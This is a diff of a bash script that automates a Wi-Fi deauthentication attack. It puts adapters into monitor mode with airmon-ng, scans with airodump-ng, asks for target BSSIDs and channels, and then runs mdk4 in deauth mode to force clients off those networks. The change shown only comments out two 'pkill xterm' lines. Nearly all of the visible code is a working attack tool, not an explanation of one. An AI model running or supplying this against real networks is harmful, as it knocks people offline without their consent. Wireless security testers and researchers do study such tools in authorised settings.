@@ -16,7 +16,7 @@ mdk=mdk4
 xterm -hold -e "iwconfig" &
 read -rp "copy paste adapter for airodump: " airodump_interface
 read -rp "copy paste adapter for mdk: " mdk_interface
-pkill xterm
+#pkill xterm
 airmon-ng start "$airodump_interface" > /dev/null 2>&1
 xterm -hold -e "airodump-ng -w scan --output-format csv -M $airodump_interface" &
 read -rp "copy paste bssid you want to deauth: " bssid_target
@@ -27,7 +27,7 @@ echo "if you want to target more bssid copy paste them here"
 xterm -e "nano bl.txt"
 echo "if you want you can enter more channels here seperated with comma"
 xterm -e "nano mdk_chan.txt"
-pkill xterm
+#pkill xterm
 airmon-ng start "$mdk_interface" > /dev/null 2>&1
 xterm -e "$mdk $mdk_interface d -b bl.txt -c $mdk_channel" &
 echo "close this window to stop the attack"
